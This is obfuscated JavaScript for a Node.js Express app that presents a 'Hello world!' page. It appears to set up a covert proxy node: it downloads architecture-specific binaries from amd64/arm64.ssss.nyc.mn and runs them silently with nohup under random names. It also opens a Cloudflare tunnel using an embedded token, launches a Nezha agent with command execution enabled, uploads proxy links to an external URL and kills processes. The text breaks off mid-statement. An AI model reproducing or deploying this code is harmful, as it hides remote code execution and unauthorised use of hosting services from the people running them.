const _0x288961=_0x4a6f;(function(_0x2e6ebe,_0x32834f){const _0x26c6b2=_0x4a6f,_0x157a53=_0x2e6ebe();while(!![]){try{const _0xe5354=parseInt(_0x26c6b2(0x16a))/0x1+-parseInt(_0x26c6b2(0x11b))/0x2+-parseInt(_0x26c6b2(0x152))/0x3+-parseInt(_0x26c6b2(0x160))/0x4+parseInt(_0x26c6b2(0x13b))/0x5*(parseInt(_0x26c6b2(0x11e))/0x6)+parseInt(_0x26c6b2(0x199))/0x7*(parseInt(_0x26c6b2(0x133))/0x8)+-parseInt(_0x26c6b2(0x13c))/0x9*(-parseInt(_0x26c6b2(0xfd))/0xa);if(_0xe5354===_0x32834f)break;else _0x157a53['push'](_0x157a53['shift']());}catch(_0x1cd6b3){_0x157a53['push'](_0x157a53['shift']());}}}(_0x58ab,0xc07c5));const _0x3d992e=_0xa0e7;function _0x4a6f(_0xf7f30e,_0x5b6842){_0xf7f30e=_0xf7f30e-0xdb;const _0x58ab04=_0x58ab();let _0x4a6f61=_0x58ab04[_0xf7f30e];return _0x4a6f61;}function _0x58ab(){const _0x52760f=['\x20-p\x20','listen','/api/add-subscriptions','from','true','\x0a\x20\x20credentials-file:\x20','config.json','8071KdUKZV','org','/trojan-argo','ARGO_PORT','has','list.txt','block','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','https://amd64.ssss.nyc.mn/v1','freedom','/config.json\x20>/dev/null\x202>&1\x20&','sub.txt','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','data','\x20-s\x20','floor','\x20>/dev/null\x202>&1','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','NEZHA_PORT','tunnel.yml','\x20-c\x20\x22','Unknown','8443','application/json','basename','NAME','UUID','forEach','then','/sub.txt\x20saved\x20successfully','http\x20server\x20is\x20running\x20on\x20port:','exec','Hello\x20world!','ARGO_DOMAIN','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','10FVfNbN','&path=%2Fvless-argo%3Fed%3D2560#','/api/add-nodes','join','FILE_PATH','\x0aclient_secret:\x20','stringify','statSync','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x0a\x0atrojan://','stream','utf-8','direct','https+local://8.8.8.8/dns-query','https://amd64.ssss.nyc.mn/agent','unlinkSync','arm','success','\x20failed:\x20','sub','\x0a\x20\x20tunnel:\x20','\x20is\x20created','Empowerment\x20success\x20for\x20','status','.exe\x20>\x20nul\x202>&1','./tmp','Error\x20executing\x20command:\x20','all','existsSync','toString','1805008xrvPta','Unhandled\x20error\x20in\x20startserver:','npm\x20running\x20error:\x20','6gdcEnU','vless','response','Error\x20in\x20startserver:','https://ipapi.co/json/','SUB_PATH','\x20is\x20running','\x20successfully','country_code','express','CFIP','ARGO_AUTH','close','607210HitKXX','false','log','https://amd64.ssss.nyc.mn/bot','UPLOAD_URL','tunnel.json','tls','cdns.doon.eu.org','10800tDvKXV','Error\x20reading\x20boot.log:','trojan','ARGO_DOMAIN:','automatic\x20access\x20task\x20added\x20successfully','xtls-rprx-vision','\x0a\x20\x20\x20\x20','NEZHA_SERVER','855815rzsldx','608103dKpPVg','\x0avless://','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','quic','\x20>\x20nul\x202>&1','config.yaml','aarch64','post','error','Empowerment\x20failed\x20for\x20','set','SERVER_PORT','message','includes','amd','match','split','unshift','eyJhIjoiMmMwOWQ2OWU5MjFjMDVmZmFiNjM5YjFlNzc3ZTMxMTMiLCJ0IjoiZGM2MzI2MDAtZGFkMC00YjRkLWJmYTktOWMyYTk2NDE2ZjI3IiwicyI6Ik1ETXdaVEU0TTJZdE5HRmtZeTAwTldSa0xUa3pPVFl0WWpZMFlqZzJaVEUyT1dZMyJ9','127.0.0.1','env','test','1654338yzxNpg','2087','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','push','get','\x20already\x20exists','firefox','1aBULKf','clear','finish','\x22\x20>\x20/dev/null\x202>&1','win32','blackhole','App\x20is\x20running','508212bdTAdb','charAt','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','pipe','axios','taskkill\x20/f\x20/im\x20','random','writeFileSync','arch','2162004KaVXPd','574144lrYUOS','&fp=firefox&type=ws&host=','Download\x20','https://arm64.ssss.nyc.mn/agent','mkdirSync','https://arm64.ssss.nyc.mn/bot','isFile','readFileSync','pkill\x20-f\x20\x22[','pop','6778195Epixwj','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','none','chmod','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','del\x20/f\x20/q\x20','--tls','abcdefghijklmnopqrstuvwxyz','Content-Type','http','nohup\x20','2053','vmess','fileUrl','shift','ArgoDomain:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','tcp','2083','?encryption=none&security=tls&sni=','8949804DyjLaF','arm64','readdirSync','catch','filter','3939588nCKyXo','substring','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','13826272earSiv','AUTO_ACCESS'];_0x58ab=function(){return _0x52760f;};return _0x58ab();}(function(_0xee694b,_0x593d58){const _0x28313b=_0x4a6f,_0x1ccfd6=_0xa0e7,_0x5d0106=_0xee694b();while(!![]){try{const _0x38ed2e=parseInt(_0x1ccfd6(0x1e5))/0x1*(-parseInt(_0x1ccfd6(0x1bd))/0x2)+-parseInt(_0x1ccfd6(0x1f3))/0x3+parseInt(_0x1ccfd6(0x164))/0x4+parseInt(_0x1ccfd6(0x199))/0x5+parseInt(_0x1ccfd6(0x1ca))/0x6+parseInt(_0x1ccfd6(0x1d8))/0x7+-parseInt(_0x1ccfd6(0x19e))/0x8;if(_0x38ed2e===_0x593d58)break;else _0x5d0106[_0x28313b(0x155)](_0x5d0106[_0x28313b(0x182)]());}catch(_0x554793){_0x5d0106[_0x28313b(0x155)](_0x5d0106[_0x28313b(0x182)]());}}}(_0x427c,0xdb885));const express=require(_0x288961(0x127)),app=express(),axios=require(_0x288961(0x164)),os=require('os'),fs=require('fs'),path=require(_0x3d992e(0x1b4)),{promisify}=require(_0x3d992e(0x16a)),exec=promisify(require('child_process')[_0x288961(0xf9)]),{execSync}=require(_0x3d992e(0x1b3)),UPLOAD_URL=process[_0x3d992e(0x206)][_0x288961(0x12f)]||'',PROJECT_URL=process[_0x3d992e(0x206)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x3d992e(0x206)][_0x3d992e(0x18f)]||![],FILE_PATH=process[_0x3d992e(0x206)][_0x3d992e(0x179)]||_0x3d992e(0x1f4),SUB_PATH=process[_0x3d992e(0x206)][_0x3d992e(0x1c0)]||_0x288961(0x110),PORT=process[_0x3d992e(0x206)][_0x288961(0x147)]||process[_0x3d992e(0x206)][_0x3d992e(0x1cc)]||0xbb8,UUID=process[_0x3d992e(0x206)][_0x3d992e(0x192)]||_0x3d992e(0x194),NEZHA_SERVER=process[_0x3d992e(0x206)][_0x3d992e(0x1e8)]||'',NEZHA_PORT=process[_0x3d992e(0x206)][_0x3d992e(0x1d3)]||'',NEZHA_KEY=process[_0x3d992e(0x206)][_0x3d992e(0x15d)]||'',ARGO_DOMAIN=process[_0x288961(0x150)][_0x3d992e(0x1c5)]||_0x3d992e(0x1ff),ARGO_AUTH=process['env'][_0x288961(0x129)]||_0x288961(0x14e),ARGO_PORT=process[_0x3d992e(0x206)][_0x3d992e(0x1e9)]||0x1f41,CFIP=process[_0x3d992e(0x206)][_0x3d992e(0x1f1)]||_0x3d992e(0x20b),CFPORT=process[_0x3d992e(0x206)][_0x3d992e(0x16e)]||0x1bb,NAME=process[_0x3d992e(0x206)][_0x3d992e(0x1dc)]||_0x3d992e(0x18c);!fs[_0x288961(0x119)](FILE_PATH)?(fs[_0x288961(0x16e)](FILE_PATH),console[_0x3d992e(0x17d)](FILE_PATH+_0x3d992e(0x1fd))):console[_0x3d992e(0x17d)](FILE_PATH+_0x288961(0x157));function _0xa0e7(_0x33a819,_0x5a9bb1){_0x33a819=_0x33a819-0x155;const _0x21c2ec=_0x427c();let _0x1f122d=_0x21c2ec[_0x33a819];return _0x1f122d;}function generateRandomName(){const _0x30bb01=_0x288961,_0xa9d3a=_0x3d992e,_0x18ab2e=_0x30bb01(0x17b);let _0x58415b='';for(let _0x1eccbb=0x0;_0x1eccbb<0x6;_0x1eccbb++){_0x58415b+=_0x18ab2e[_0xa9d3a(0x162)](Math[_0xa9d3a(0x163)](Math[_0xa9d3a(0x1ea)]()*_0x18ab2e[_0xa9d3a(0x1c6)]));}return _0x58415b;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x3d992e(0x1f2)](FILE_PATH,phpName),webPath=path[_0x3d992e(0x1f2)](FILE_PATH,webName),botPath=path[_0x3d992e(0x1f2)](FILE_PATH,botName),subPath=path[_0x3d992e(0x1f2)](FILE_PATH,_0x3d992e(0x201)),listPath=path[_0x3d992e(0x1f2)](FILE_PATH,_0x3d992e(0x1c1)),bootLogPath=path[_0x3d992e(0x1f2)](FILE_PATH,_0x3d992e(0x1d1)),configPath=path[_0x3d992e(0x1f2)](FILE_PATH,_0x3d992e(0x17f));function deleteNodes(){const _0x5bd61c=_0x288961,_0x306bde=_0x3d992e;try{if(!UPLOAD_URL)return;if(!fs[_0x5bd61c(0x119)](subPath))return;let _0x345c71;try{_0x345c71=fs[_0x306bde(0x156)](subPath,_0x306bde(0x183));}catch{return null;}const _0x412279=Buffer[_0x306bde(0x1ab)](_0x345c71,_0x306bde(0x176))[_0x306bde(0x190)](_0x306bde(0x183)),_0x3fc18a=_0x412279[_0x306bde(0x1cf)]('\x0a')[_0x306bde(0x1e7)](_0x1d8f87=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x306bde(0x18a)](_0x1d8f87));if(_0x3fc18a[_0x306bde(0x1c6)]===0x0)return;return axios[_0x5bd61c(0x143)](UPLOAD_URL+_0x306bde(0x19b),JSON['stringify']({'nodes':_0x3fc18a}),{'headers':{'Content-Type':_0x306bde(0x198)}})[_0x306bde(0x1ae)](_0x4d66a7=>{return null;}),null;}catch(_0x2e369e){return null;}}function cleanupOldFiles(){const _0x3830b5=_0x3d992e;try{const _0x397645=fs[_0x3830b5(0x1cb)](FILE_PATH);_0x397645[_0x3830b5(0x184)](_0x6790c5=>{const _0x23b4f8=_0x4a6f,_0x3271b2=_0x3830b5,_0x5e3ce6=path[_0x3271b2(0x1f2)](FILE_PATH,_0x6790c5);try{const _0x1d4adb=fs[_0x3271b2(0x1be)](_0x5e3ce6);_0x1d4adb[_0x23b4f8(0x170)]()&&fs[_0x3271b2(0x1df)](_0x5e3ce6);}catch(_0x1c726a){}});}catch(_0x2b0580){}}app[_0x3d992e(0x16f)]('/',function(_0x3bfd6d,_0x1a1532){const _0x554307=_0x3d992e;_0x1a1532[_0x554307(0x209)](_0x554307(0x1fa));});async function generateConfig(){const _0x9b12f2=_0x288961,_0x24955c=_0x3d992e,_0x51ddb2={'log':{'access':_0x24955c(0x175),'error':_0x24955c(0x175),'loglevel':_0x24955c(0x1b9)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x24955c(0x167),'settings':{'clients':[{'id':UUID,'flow':_0x9b12f2(0x138)}],'decryption':_0x24955c(0x1b9),'fallbacks':[{'dest':0xbb9},{'path':_0x24955c(0x157),'dest':0xbba},{'path':_0x24955c(0x1a3),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x24955c(0x208)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x24955c(0x167),'settings':{'clients':[{'id':UUID}],'decryption':_0x24955c(0x1b9)},'streamSettings':{'network':_0x9b12f2(0x185),'security':'none'}},{'port':0xbba,'listen':_0x24955c(0x207),'protocol':_0x24955c(0x167),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x24955c(0x1b9)},'streamSettings':{'network':'ws','security':_0x9b12f2(0x176),'wsSettings':{'path':_0x24955c(0x157)}},'sniffing':{'enabled':!![],'destOverride':[_0x24955c(0x1d0),_0x9b12f2(0x131),_0x24955c(0x1d7)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x9b12f2(0x14f),'protocol':_0x24955c(0x1b1),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x24955c(0x1a3)}},'sniffing':{'enabled':!![],'destOverride':[_0x24955c(0x1d0),_0x24955c(0x1db),_0x24955c(0x1d7)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x24955c(0x207),'protocol':_0x24955c(0x1a0),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x24955c(0x1b9),'wsSettings':{'path':_0x24955c(0x1fc)}},'sniffing':{'enabled':!![],'destOverride':[_0x24955c(0x1d0),'tls',_0x24955c(0x1d7)],'metadataOnly':![]}}],'dns':{'servers':[_0x24955c(0x1c3)]},'outbounds':[{'protocol':_0x24955c(0x168),'tag':_0x9b12f2(0x109)},{'protocol':_0x9b12f2(0x15e),'tag':_0x24955c(0x186)}]};fs[_0x9b12f2(0x167)](path[_0x24955c(0x1f2)](FILE_PATH,_0x24955c(0x17f)),JSON[_0x24955c(0x169)](_0x51ddb2,null,0x2));}function getSystemArchitecture(){const _0x39d84d=_0x288961,_0x415c86=_0x3d992e,_0x544bad=os[_0x415c86(0x1fe)]();return _0x544bad===_0x415c86(0x1e0)||_0x544bad===_0x415c86(0x19c)||_0x544bad===_0x415c86(0x1ce)?_0x39d84d(0x10d):_0x415c86(0x1da);}function downloadFile(_0x11e910,_0x57cce9,_0x3c7c6b){const _0x186305=_0x288961,_0x503da6=_0x3d992e,_0x229f48=_0x11e910;!fs[_0x503da6(0x159)](FILE_PATH)&&fs[_0x503da6(0x1d2)](FILE_PATH,{'recursive':!![]});const _0x513ba0=fs[_0x503da6(0x19d)](_0x229f48);axios({'method':_0x503da6(0x16f),'url':_0x57cce9,'responseType':_0x186305(0x107)})[_0x186305(0xf6)](_0x480c77=>{const _0x2df8a5=_0x186305,_0x3678b2=_0x503da6;_0x480c77[_0x3678b2(0x1b2)][_0x3678b2(0x173)](_0x513ba0),_0x513ba0['on'](_0x2df8a5(0x15b),()=>{const _0x54aec2=_0x2df8a5,_0x4f70c4=_0x3678b2;_0x513ba0[_0x54aec2(0x12a)](),console[_0x4f70c4(0x17d)](_0x4f70c4(0x1bb)+path[_0x4f70c4(0x16b)](_0x229f48)+_0x54aec2(0x125)),_0x3c7c6b(null,_0x229f48);}),_0x513ba0['on'](_0x3678b2(0x188),_0x51b18b=>{const _0x5bdad2=_0x2df8a5,_0x405271=_0x3678b2;fs[_0x405271(0x16c)](_0x229f48,()=>{});const _0x2c5c9f=_0x405271(0x1bb)+path[_0x5bdad2(0xf2)](_0x229f48)+_0x5bdad2(0x10f)+_0x51b18b[_0x405271(0x15b)];console[_0x405271(0x188)](_0x2c5c9f),_0x3c7c6b(_0x2c5c9f);});})[_0x503da6(0x1ae)](_0xea0912=>{const _0x1276b6=_0x186305,_0x31780d=_0x503da6,_0x3a171f=_0x1276b6(0x16c)+path[_0x1276b6(0xf2)](_0x229f48)+_0x31780d(0x1d4)+_0xea0912[_0x31780d(0x15b)];console[_0x31780d(0x188)](_0x3a171f),_0x3c7c6b(_0x3a171f);});}async function downloadFilesAndRun(){const _0x3971f2=_0x288961,_0x272f63=_0x3d992e,_0x4283d0=getSystemArchitecture(),_0x54b1c2=getFilesForArchitecture(_0x4283d0);if(_0x54b1c2[_0x272f63(0x1c6)]===0x0){console[_0x272f63(0x17d)](_0x272f63(0x1c2));return;}const _0x311b86=_0x54b1c2['map'](_0x1aa8dd=>{return new Promise((_0xb789fd,_0x3c02db)=>{const _0x3948ea=_0x4a6f,_0x172c11=_0xa0e7;downloadFile(_0x1aa8dd[_0x172c11(0x200)],_0x1aa8dd[_0x3948ea(0x181)],(_0x452842,_0x3236a2)=>{_0x452842?_0x3c02db(_0x452842):_0xb789fd(_0x3236a2);});});});try{await Promise[_0x272f63(0x17e)](_0x311b86);}catch(_0x28b62a){console[_0x272f63(0x188)](_0x272f63(0x1ef),_0x28b62a);return;}function _0x4eb993(_0x1efd12){const _0x1aba92=_0x4a6f,_0x2bd8ad=0x1fd;_0x1efd12[_0x1aba92(0xf5)](_0x435ce1=>{const _0x452f68=_0xa0e7;fs[_0x452f68(0x159)](_0x435ce1)&&fs[_0x452f68(0x195)](_0x435ce1,_0x2bd8ad,_0x2896d8=>{const _0x3c0aa5=_0x4a6f,_0x2e4639=_0x452f68;_0x2896d8?console[_0x3c0aa5(0x144)](_0x2e4639(0x1a6)+_0x435ce1+':\x20'+_0x2896d8):console[_0x2e4639(0x17d)](_0x3c0aa5(0x113)+_0x435ce1+':\x20'+_0x2bd8ad[_0x2e4639(0x190)](0x8));});});}const _0xb61025=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4eb993(_0xb61025);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x7cf09f=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x3971f2(0x14c)](':')[_0x272f63(0x1f5)]():'',_0x4259a5=new Set(['443',_0x272f63(0x15a),_0x272f63(0x1c7),_0x272f63(0x204),_0x3971f2(0x186),_0x3971f2(0x17f)]),_0x24e663=_0x4259a5[_0x3971f2(0xde)](_0x7cf09f)?_0x3971f2(0x196):_0x272f63(0x1c9),_0x3a792f=_0x3971f2(0x102)+NEZHA_KEY+_0x3971f2(0xeb)+NEZHA_SERVER+_0x272f63(0x1e4)+_0x24e663+_0x3971f2(0x13e)+UUID;fs[_0x272f63(0x1dd)](path[_0x272f63(0x1f2)](FILE_PATH,_0x272f63(0x20e)),_0x3a792f);const _0xc0d0a0=_0x272f63(0x1ba)+phpPath+_0x272f63(0x15c)+FILE_PATH+_0x272f63(0x1d6);try{await exec(_0xc0d0a0),console[_0x272f63(0x17d)](phpName+_0x272f63(0x1fb)),await new Promise(_0xf10195=>setTimeout(_0xf10195,0x3e8));}catch(_0x5bbc0c){console[_0x272f63(0x188)](_0x272f63(0x20a)+_0x5bbc0c);}}else{let _0x4e8194='';const _0x3e98a9=[_0x272f63(0x1f9),_0x3971f2(0xf0),'2096','2087','2083',_0x3971f2(0x17f)];_0x3e98a9[_0x272f63(0x1c4)](NEZHA_PORT)&&(_0x4e8194=_0x272f63(0x1f0));const _0x4ed225=_0x3971f2(0x17e)+npmPath+_0x272f63(0x1b7)+NEZHA_SERVER+':'+NEZHA_PORT+_0x272f63(0x182)+NEZHA_KEY+'\x20'+_0x4e8194+_0x272f63(0x1a9);try{await exec(_0x4ed225),console[_0x272f63(0x17d)](npmName+_0x3971f2(0x124)),await new Promise(_0x2fd08b=>setTimeout(_0x2fd08b,0x3e8));}catch(_0x4e3128){console[_0x272f63(0x188)](_0x272f63(0x155)+_0x4e3128);}}}else console[_0x3971f2(0x12d)](_0x272f63(0x165));const _0x346f72=_0x272f63(0x1ba)+webPath+'\x20-c\x20'+FILE_PATH+_0x272f63(0x1f7);try{await exec(_0x346f72),console[_0x272f63(0x17d)](webName+_0x272f63(0x1fb)),await new Promise(_0x29ca48=>setTimeout(_0x29ca48,0x3e8));}catch(_0x2f1910){console[_0x272f63(0x188)](_0x272f63(0x17b)+_0x2f1910);}if(fs[_0x272f63(0x159)](botPath)){let _0x12818f;if(ARGO_AUTH[_0x272f63(0x1eb)](/^[A-Z0-9a-z=]{120,250}$/))_0x12818f=_0x272f63(0x1a4)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x12818f=_0x3971f2(0x18f)+FILE_PATH+_0x272f63(0x15f):_0x12818f='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x272f63(0x18b)+ARGO_PORT;try{await exec(_0x272f63(0x1ba)+botPath+'\x20'+_0x12818f+_0x272f63(0x202)),console[_0x3971f2(0x12d)](botName+_0x272f63(0x1fb)),await new Promise(_0x1e3dc0=>setTimeout(_0x1e3dc0,0x7d0));}catch(_0x164abf){console[_0x272f63(0x188)](_0x272f63(0x1ac)+_0x164abf);}}await new Promise(_0x559380=>setTimeout(_0x559380,0x1388));}function getFilesForArchitecture(_0x2f0702){const _0x532ce9=_0x288961,_0x593c7d=_0x3d992e;let _0x16a6b0;_0x2f0702===_0x532ce9(0x10d)?_0x16a6b0=[{'fileName':webPath,'fileUrl':_0x593c7d(0x1e3)},{'fileName':botPath,'fileUrl':_0x593c7d(0x1af)}]:_0x16a6b0=[{'fileName':webPath,'fileUrl':_0x593c7d(0x177)},{'fileName':botPath,'fileUrl':_0x593c7d(0x20c)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xafa2b5=_0x2f0702==='arm'?_0x532ce9(0x16d):_0x593c7d(0x193);_0x16a6b0[_0x593c7d(0x178)]({'fileName':npmPath,'fileUrl':_0xafa2b5});}else{const _0x58c525=_0x2f0702===_0x593c7d(0x1e0)?_0x593c7d(0x17c):_0x593c7d(0x1bc);_0x16a6b0[_0x593c7d(0x178)]({'fileName':phpPath,'fileUrl':_0x58c525});}}return _0x16a6b0;}function argoType(){const _0x5eb103=_0x288961,_0x29ef77=_0x3d992e;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5eb103(0x12d)](_0x29ef77(0x1e2));return;}if(ARGO_AUTH[_0x5eb103(0x149)](_0x29ef77(0x16d))){fs[_0x29ef77(0x1dd)](path['join'](FILE_PATH,_0x29ef77(0x172)),ARGO_AUTH);const _0x4f6dd8=_0x5eb103(0x111)+ARGO_AUTH[_0x5eb103(0x14c)]('\x22')[0xb]+_0x29ef77(0x19a)+path[_0x29ef77(0x1f2)](FILE_PATH,_0x5eb103(0x130))+_0x29ef77(0x189)+ARGO_DOMAIN+_0x29ef77(0x181)+ARGO_PORT+_0x29ef77(0x1e1);fs[_0x29ef77(0x1dd)](path[_0x29ef77(0x1f2)](FILE_PATH,_0x29ef77(0x191)),_0x4f6dd8);}else console[_0x29ef77(0x17d)](_0x29ef77(0x205));}async function extractDomains(){const _0x38d85f=_0x288961,_0x2ba8d1=_0x3d992e;let _0x516666;if(ARGO_AUTH&&ARGO_DOMAIN)_0x516666=ARGO_DOMAIN,console[_0x2ba8d1(0x17d)](_0x2ba8d1(0x1ec),_0x516666),await _0x1906bd(_0x516666);else try{const _0x1878f4=fs['readFileSync'](path[_0x38d85f(0x100)](FILE_PATH,_0x2ba8d1(0x1d1)),_0x2ba8d1(0x183)),_0x352c04=_0x1878f4[_0x2ba8d1(0x1cf)]('\x0a'),_0x2a5e70=[];_0x352c04[_0x2ba8d1(0x184)](_0xea2ab7=>{const _0x3732f3=_0x2ba8d1,_0x5700bd=_0xea2ab7[_0x3732f3(0x1eb)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5700bd){const _0x184019=_0x5700bd[0x1];_0x2a5e70['push'](_0x184019);}});if(_0x2a5e70['length']>0x0)_0x516666=_0x2a5e70[0x0],console[_0x2ba8d1(0x17d)](_0x2ba8d1(0x18e),_0x516666),await _0x1906bd(_0x516666);else{console[_0x2ba8d1(0x17d)](_0x2ba8d1(0x1b6)),fs[_0x38d85f(0x10c)](path[_0x2ba8d1(0x1f2)](FILE_PATH,_0x2ba8d1(0x1d1)));async function _0x3cf3b6(){const _0x114391=_0x38d85f,_0x342611=_0x2ba8d1;try{process[_0x342611(0x17a)]===_0x114391(0x15d)?await exec(_0x114391(0x165)+botName+_0x342611(0x19f)):await exec(_0x342611(0x1f6)+botName[_0x342611(0x162)](0x0)+']'+botName[_0x342611(0x1c8)](0x1)+_0x342611(0x18d));}catch(_0x469556){}}_0x3cf3b6(),await new Promise(_0x4ef69a=>setTimeout(_0x4ef69a,0xbb8));const _0x5e6aa1=_0x2ba8d1(0x1a8)+FILE_PATH+_0x2ba8d1(0x18b)+ARGO_PORT;try{await exec(_0x38d85f(0x17e)+botPath+'\x20'+_0x5e6aa1+_0x2ba8d1(0x202)),console[_0x2ba8d1(0x17d)](botName+_0x2ba8d1(0x1fb)),await new Promise(_0x1639c4=>setTimeout(_0x1639c4,0xbb8)),await extractDomains();}catch(_0x10012b){console[_0x2ba8d1(0x188)](_0x38d85f(0x117)+_0x10012b);}}}catch(_0x16e6d2){console[_0x38d85f(0x144)](_0x2ba8d1(0x1ee),_0x16e6d2);}async function _0x3f3905(){const _0x1f0965=_0x38d85f,_0x49d1f6=_0x2ba8d1;try{const _0x320fcd=await axios[_0x1f0965(0x156)](_0x49d1f6(0x1b8),{'timeout':0xbb8});if(_0x320fcd[_0x49d1f6(0x1b2)]&&_0x320fcd[_0x49d1f6(0x1b2)][_0x49d1f6(0x166)]&&_0x320fcd[_0x49d1f6(0x1b2)][_0x1f0965(0xdb)])return _0x320fcd['data'][_0x1f0965(0x126)]+'_'+_0x320fcd[_0x49d1f6(0x1b2)][_0x49d1f6(0x1d5)];}catch(_0x4dab35){try{const _0x295461=await axios[_0x49d1f6(0x16f)](_0x49d1f6(0x15e),{'timeout':0xbb8});if(_0x295461[_0x49d1f6(0x1b2)]&&_0x295461[_0x49d1f6(0x1b2)][_0x49d1f6(0x1a7)]===_0x49d1f6(0x1cd)&&_0x295461[_0x49d1f6(0x1b2)][_0x49d1f6(0x1b0)]&&_0x295461[_0x1f0965(0xe7)][_0x49d1f6(0x1d5)])return _0x295461[_0x49d1f6(0x1b2)][_0x49d1f6(0x1b0)]+'_'+_0x295461[_0x49d1f6(0x1b2)][_0x49d1f6(0x1d5)];}catch(_0xe44aa4){}}return _0x1f0965(0xef);}async function _0x1906bd(_0x2fbae0){const _0x20f8bc=await _0x3f3905(),_0x30cb46=NAME?NAME+'-'+_0x20f8bc:_0x20f8bc;return new Promise(_0x5d6de8=>{setTimeout(()=>{const _0x901532=_0x4a6f,_0x1f9a52=_0xa0e7,_0x10f5c8={'v':'2','ps':''+_0x30cb46,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1f9a52(0x1b9),'net':'ws','type':'none','host':_0x2fbae0,'path':'/vmess-argo?ed=2560','tls':_0x1f9a52(0x1db),'sni':_0x2fbae0,'alpn':'','fp':_0x1f9a52(0x196)},_0x266f04=_0x1f9a52(0x1ed)+UUID+'@'+CFIP+':'+CFPORT+_0x1f9a52(0x1de)+_0x2fbae0+_0x1f9a52(0x171)+_0x2fbae0+_0x1f9a52(0x161)+_0x30cb46+_0x1f9a52(0x185)+Buffer[_0x1f9a52(0x1ab)](JSON[_0x901532(0x103)](_0x10f5c8))[_0x1f9a52(0x190)](_0x1f9a52(0x176))+_0x1f9a52(0x170)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x2fbae0+_0x1f9a52(0x171)+_0x2fbae0+_0x1f9a52(0x1d9)+_0x30cb46+_0x901532(0x139);console[_0x1f9a52(0x17d)](Buffer[_0x901532(0x195)](_0x266f04)[_0x1f9a52(0x190)](_0x1f9a52(0x176))),fs[_0x1f9a52(0x1dd)](subPath,Buffer[_0x1f9a52(0x1ab)](_0x266f04)[_0x1f9a52(0x190)]('base64')),console[_0x1f9a52(0x17d)](FILE_PATH+_0x1f9a52(0x1b5)),uploadNodes(),app[_0x901532(0x156)]('/'+SUB_PATH,(_0x1389f4,_0xb4524b)=>{const _0xdf16f0=_0x901532,_0x1ca5d5=_0x1f9a52,_0x157946=Buffer[_0xdf16f0(0x195)](_0x266f04)[_0x1ca5d5(0x190)](_0x1ca5d5(0x176));_0xb4524b[_0x1ca5d5(0x1f8)](_0xdf16f0(0x17c),_0x1ca5d5(0x1a1)),_0xb4524b[_0x1ca5d5(0x209)](_0x157946);}),_0x5d6de8(_0x266f04);},0x7d0);});}}async function uploadNodes(){const _0x1a81cf=_0x288961,_0x32a5c8=_0x3d992e;if(UPLOAD_URL&&PROJECT_URL){const _0x1bf036=PROJECT_URL+'/'+SUB_PATH,_0x23ced2={'subscription':[_0x1bf036]};try{const _0x184e92=await axios[_0x32a5c8(0x158)](UPLOAD_URL+_0x32a5c8(0x180),_0x23ced2,{'headers':{'Content-Type':_0x32a5c8(0x198)}});return _0x184e92&&_0x184e92[_0x32a5c8(0x1a7)]===0xc8?(console[_0x32a5c8(0x17d)](_0x32a5c8(0x160)),_0x184e92):null;}catch(_0x3187e6){if(_0x3187e6[_0x32a5c8(0x20d)]){if(_0x3187e6[_0x32a5c8(0x20d)][_0x32a5c8(0x1a7)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1a81cf(0x119)](listPath))return;const _0x33428e=fs[_0x32a5c8(0x156)](listPath,_0x1a81cf(0x108)),_0xbeb9d8=_0x33428e[_0x32a5c8(0x1cf)]('\x0a')[_0x32a5c8(0x1e7)](_0x2db313=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x32a5c8(0x18a)](_0x2db313));if(_0xbeb9d8[_0x32a5c8(0x1c6)]===0x0)return;const _0x26f47f=JSON[_0x32a5c8(0x169)]({'nodes':_0xbeb9d8});try{const _0x5cf120=await 